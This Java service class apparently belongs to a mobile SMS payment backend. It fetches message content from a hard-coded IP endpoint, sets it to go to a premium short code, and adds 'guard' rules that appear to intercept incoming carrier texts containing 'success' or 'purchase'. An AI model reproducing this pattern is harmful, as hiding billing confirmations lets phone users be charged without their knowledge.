package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class BjjsLt2DynamicService implements IDynamicService{

	private static final String TYPE = "bjjsLt2";
	
	private static final String DEST = "1065547794010";

	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "appId={appId}&productId={productId}&channel={channelid}";
	
	private static final Guard guard0 = new Guard("10655477","成功|购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10655","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String appId = map.get("appId");
			String productId = map.get("productId");
			String channelid = map.get("channelid");
			
			String param = REQUESTMODEL.replace("{appId}",appId).replace("{productId}",productId).replace("{channelid}",channelid);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parseTxt(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseTxt(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			
			List<Sms> smsList = new ArrayList<Sms>();
			
			Sms sms = new Sms();
			
			sms.setSmsContent(responseTxt);
			sms.setSmsDest(DEST);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			smsList.add(sms);
			
			Sms guardSms = new Sms();
			
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard0);
			guardList.add(guard1);
			
			guardSms.setGuardList(guardList);
			
			smsList.add(0, guardSms);
				
			return XstreamHelper.toXml(smsList);
				
		}
		
		return null;
	}
	
	public static void main(String[] args){
		String url = "http://58.67.198.100:9448/wo/wosms.php";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "bjjsLt2");
		map.put("channel", "10B101a87654322");
		map.put("appId", "72379");
		map.put("productId","5132");
		map.put("channelid","190001");
		
		System.out.println(new BjjsLt2DynamicService().dynamic(map));
		
		
		
	}
}
